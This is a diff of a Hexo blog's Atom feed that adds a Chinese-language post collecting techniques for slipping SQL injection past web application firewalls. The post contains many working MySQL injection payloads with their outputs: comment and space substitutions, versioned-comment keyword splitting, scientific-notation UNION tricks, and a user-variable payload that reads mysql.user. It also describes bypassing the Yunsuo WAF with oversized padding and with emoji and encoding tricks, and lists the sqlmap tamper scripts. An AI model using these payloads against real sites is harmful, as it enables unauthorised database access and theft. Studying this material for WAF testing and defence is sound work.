@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://jaychouzzk.github.io/"/>
-  <updated>2019-01-06T08:20:06.195Z</updated>
+  <updated>2019-01-20T05:13:42.814Z</updated>
   <id>https://jaychouzzk.github.io/</id>
   
   <author>
@@ -15,6 +15,48 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>总结：waf绕过技巧-sql，不完整版待补充</title>
+    <link href="https://jaychouzzk.github.io/2019/01/20/%E6%80%BB%E7%BB%93%EF%BC%9Awaf%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7-sql%EF%BC%8C%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%89%88%E5%BE%85%E8%A1%A5%E5%85%85/"/>
+    <id>https://jaychouzzk.github.io/2019/01/20/总结：waf绕过技巧-sql，不完整版待补充/</id>
+    <published>2019-01-20T05:14:25.312Z</published>
+    <updated>2019-01-20T05:13:42.814Z</updated>
+    
+    <content type="html"><![CDATA[<hr><p>一、注释</p><pre><code>代替注释的符号：#--///*letmetest*/;</code></pre><hr><pre><code>可以用来代替空格的：--+--- -/**/    /*！*/    /*!union*/    可以用来代替union两边的空格mysql&gt; select * from stu where id=.1/*!union*/(select@,(select name from`stu`limit 1,1));+------+------+| id   | name |+------+------+| NULL | ss   |+------+------+1 row in set (0.02 sec)</code></pre><hr><p>二、特殊用法</p><pre><code>科学记数法：mysql&gt; select * from stu where id=1e0union(select(2),(select(name)from(stu)limit 1,1));+------+------+| id   | name |+------+------+|    1 | zs   ||    1 | aaa  ||    2 | ss   |+------+------+3 rows in set (0.00 sec)一些特殊符号用法：(1)    +mysql&gt; select * from stu where id=8e0union(select+1,(select schema_name from information_schema.schemata limit 1,1));+------+------------+| id   | name       |+------+------------+|    1 | challenges |+------+------------+1 row in set (0.00 sec)(2) - 用法mysql&gt; select * from stu where id=8e0union(select-1,(select schema_name from information_schema.schemata limit 1,1));+------+------------+| id   | name       |+------+------------+|   -1 | challenges |+------+------------+1 row in set (0.00 sec)(3) ``一些用法mysql&gt; select * from stu where id=8e0union(select-1,(select`schema_name`from information_schema.schemata limit 1,1));+------+------------+| id   | name       |+------+------------+|   -1 | challenges |+------+------------+1 row in set (0.00 sec)但是这样使用就会出错mysql&gt; select * from stu where id=8e0union(select+1,(select schema_name from `information_schema.schemata` limit 1,1));ERROR 1146 (42S02): Table &apos;mysql.information_schema.schemata&apos; doesn&apos;t exist这样使用就okmysql&gt; select * from stu where id=8e0union(select+1,(select id from `stu` limit 1,1));+------+------+| id   | name |+------+------+|    1 | 2    |+------+------+1 row in set (0.00 sec)(4) ~ 和+ - 的用法差不多mysql&gt; select * from stu where id=8e0union(select~1,(select`name`from`stu`limit 1,1));+---------------------+------+| id                  | name |+---------------------+------+| 9223372036854775807 | ss   |+---------------------+------+1 row in set (0.00 sec)(5) !mysql&gt; select * from stu where id=8e0union(select!1,(select`name`from`stu`limit 1,1));+------+------+| id   | name |+------+------+|    0 | ss   |+------+------+1 row in set (0.00 sec)(6) @    可以看到@后的值直接为null了，@后可以加任意值mysql&gt; select * from stu where id=8e0union(select@dawdwadwadwadawdwa,(select name from`stu`limit 1,1));+------+------+| id   | name |+------+------+| NULL | ss   |+------+------+1 row in set (0.02 sec)mysql&gt; select * from stu where id=8e0union(select@1,(select name from`stu`limit 1,1));+------+------+| id   | name |+------+------+| NULL | ss   |+------+------+1 row in set (0.16 sec)(7) . 后可以加任意数字进行组合，结果都会返回一个空mysql&gt; select * from stu where id=.12312321312union(select@,(select name from`stu`limit 1,1));+------+------+| id   | name |+------+------+| NULL | ss   |+------+------+1 row in set (0.02 sec)(8) &apos;&apos; 单引号mysql&gt; select * from stu where id=.1union(select&apos;1&apos;,(select name from`stu`limit 1,1));+------+------+| id   | name |+------+------+| 1    | ss   |+------+------+1 row in set (0.00 sec)(9) ()mysql&gt; select * from stu where id=0e1union(select(1),(select(name)from(stu)limit 1,1));+------+------+| id   | name |+------+------+|    1 | ss   |+------+------+1 row in set (0.00 sec)(10) {}  花括号的一些用法    1.将多个独立语句合并为一个复合语句        例如：if...else...    2.在变量间接引用中进行定界，避免歧义    例如：${$my_var[8]}与${$my_var}[8]的区分    3.用于指示字符串变量中的单个字符，避免歧义        例如：        $my_str = &quot;1234&quot;;        $my_str{1} = &apos;5&apos;;  //这个时候$my_str中的值为&quot;1534&quot;    这种用法为PHP5以上版本之后的特性，用于消除使用中括号引起的歧义    4.界定变量的名称            例如：        $var = &apos;sky&apos;;        echo &quot;{$var}boy&quot;;    5.主要用来输出复杂变量</code></pre><hr><p>三、MySQL中的函数：</p><pre><code>(1)字符串转换函数     Unhex()与hex()函数 可以转换多个字符  ascii()输出10进制的ascii---char()只能转换第一个字符mysql&gt; select unhex(hex(@@version));+-----------------------+| unhex(hex(@@version)) |+-----------------------+| 5.5.53                |+-----------------------+1 row in set (0.00 sec)unhex(version())=352E352E3533mysql&gt; select unhex(352E352E3533);ERROR 1367 (22007): Illegal double &apos;352E352&apos; value found during parsingmysql&gt; select unhex(hex(version()));+-----------------------+| unhex(hex(version())) |+-----------------------+| 5.5.53                |+-----------------------+1 row in set (0.00 sec)(2) concat(),concat_ws()函数，一般用于连接字符串,参数可以有很多,concat_ws()的第一个参数是用来分割的mysql&gt; select concat(0x7e,@@version);+------------------------+| concat(0x7e,@@version) |+------------------------+| ~5.5.53                |+------------------------+1 row in set (0.00 sec)(3) distinct  distinctrow用来去重    all()只能有一个参数    distinct()可以有多个参数    distinctrow()只能有一个参数    都可以单独使用，如 select all 1；group_concat(distinct column_name)    与group by配合使用，添加distinct后，将不同的column_name连接起来mysql&gt; select group_concat(distinct @@version,user());+-----------------------------------------+| group_concat(distinct @@version,user()) |+-----------------------------------------+| 5.5.53root@localhost                    |+-----------------------------------------+1 row in set (0.00 sec)mysql&gt; select/*!distinctrow*/*/**/from/*!stu*//*!where*/id=1;+------+------+| id   | name |+------+------+|    1 | zs   ||    1 | aaa  |+------+------+2 rows in set (0.00 sec)(4)字符串截取函数Mid(version(),1,1)Substr(version(),1,1)Substring(version(),1,1)Lpad(version(),1,1)Rpad(version(),1,1)Left(version(),1)reverse(right(reverse(version()),1)mysql&gt; select reverse(right(reverse(version()),6));+--------------------------------------+| reverse(right(reverse(version()),6)) |+--------------------------------------+| 5.5.53                               |+--------------------------------------+1 row in set (0.00 sec)(5)exec()(6)报错函数procedure analyse()updatexml()extracavalue()exp()ceil()atan()sqrt()floor()ceiling()tan()rand()sign()greatest()</code></pre><hr><h2 id="四、waf绕过的一些技巧"><a href="#四、waf绕过的一些技巧" class="headerlink" title="四、waf绕过的一些技巧"></a>四、waf绕过的一些技巧</h2><pre><code>过滤了逗号(1)limit处的逗号：limit 1 offset 0(2)字符串截取处的逗号mid处的逗号：mid(version() from 1 for 1)mysql中的自定义变量：</code></pre><hr><pre><code>当过滤了union+select+from时可以用自定义变量组合成select+from+union例：payload：id=2|@pwd:=(select/*dd*/user/*dd*/from/*dd*/user/*dd*/where/*dd*/host=&apos;localhost&apos;)/*dd*/union/*dd*/select/*dd*/@pwdmysql&gt; select name from stu where id=2|@pwd:=(select user from user where host=&apos;localhost&apos;)/*!union select @pwd*/;+------+| name |+------+| ss   || root |+------+2 rows in set (0.05 sec)</code></pre><hr><pre><code>fuzz了下/*!50000select*/这个5位数，前两位数&lt;50 &amp;&amp; 第二位!==0 &amp;&amp; 后三位数==0即可bypass。(一点细节也不要放过。)当union+select拦截，select+from拦截，union+from不拦截的时候，关键时绕过select这个关键字    1.例payload:        id=2 union/*!12312%0aselect all*/user(),version() from stu        id=1&apos; union/*!50000select%0aall*/username from users%23        id=1&apos; union/*!50000select%0adistinct*/username from users%23        id=1&apos; union/*!50000select%0adistinctrow*/username from users%23mysql&gt; select id,name from stu where id=2 union/*!12312-&gt; select all*/user(),version() from stu;+----------------+--------+| id             | name   |+----------------+--------+| 2              | ss     || root@localhost | 5.5.53 |+----------------+--------+2 rows in set (0.00 sec)</code></pre><hr><pre><code>超长字符串查询，可能会让waf挂掉payload：        /*66666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666*/云锁超长字符串绕过：    云锁在开始检测时先判断包的大小是否为7250byte以下，n为填充包内容，设置n大小为2328时，可以正常访问页面，但是会提示拦截了SQL注入    当数据包超过2329时就可以成功绕过，2329长度以后的就不检测了。</code></pre><hr><pre><code>表情包绕过，愤怒表情，urlencode=%f0%9f%98%0a最后一位是%a0，那么也就是说完全可以忽略掉最后一位，而多数emoji第四位是 ascii 127的字符，会导致waf引擎无法检测。</code></pre><hr><pre><code>双重编码：这个要视场景而定，如果确定一个带有waf的site存在解码后注入的漏洞的话，会有效避过waf。    unlencode    base64    json    binary    querystring    htmlencode    unicode    php serialize</code></pre><hr><pre><code>宽字节注入待补充</code></pre><hr><p> 五、sqlmap自动化bypass：</p><pre><code> apostrophemask.py 用UTF-8全角字符替换单引号字符apostrophenullencode.py 用非法双字节unicode字符替换单引号字符appendnullbyte.py 在payload末尾添加空字符编码base64encode.py 对给定的payload全部字符使用Base64编码between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例equaltolike.py 用“LIKE”运算符替换全部等于号“=”greatest.py 用“GREATEST”函数替换大于号“&gt;”halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例lowercase.py 用小写值替换每个关键字字符modsecurityversioned.py 用注释包围完整的查询modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询multiplespaces.py 在SQL关键字周围添加多个空格nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器overlongutf8.py 转换给定的payload当中的所有字符percentage.py 在每个字符之前添加一个百分号randomcase.py 随机转换每个关键字字符的大小写randomcomments.py 向SQL关键字中插入随机注释securesphere.py 添加经过特殊构造的字符串sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logsspace2comment.py 用“/**/”替换空格符space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符space2plus.py 用加号“+”替换空格符space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAFversionedkeywords.py 用MySQL注释包围每个非函数关键字versionedmorekeywords.py 用MySQL注释包围每个关键字xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;hr&gt;
+&lt;p&gt;一、注释&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;代替注释的符号：
+
+#
+--
+//
+/*letmetest*/
+;
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
+&lt;pre&gt;&lt;code&gt;可以用来代替空格的：
+
+--+-
+-- -
+/**/    
+/*！*/    
+
+/*!unio
+      
+    
+    </summary>
+    
+    
+      <category term="mysql" scheme="https://jaychouzzk.github.io/tags/mysql/"/>
+    
+      <category term="sql注入" scheme="https://jaychouzzk.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>xss小游戏</title>
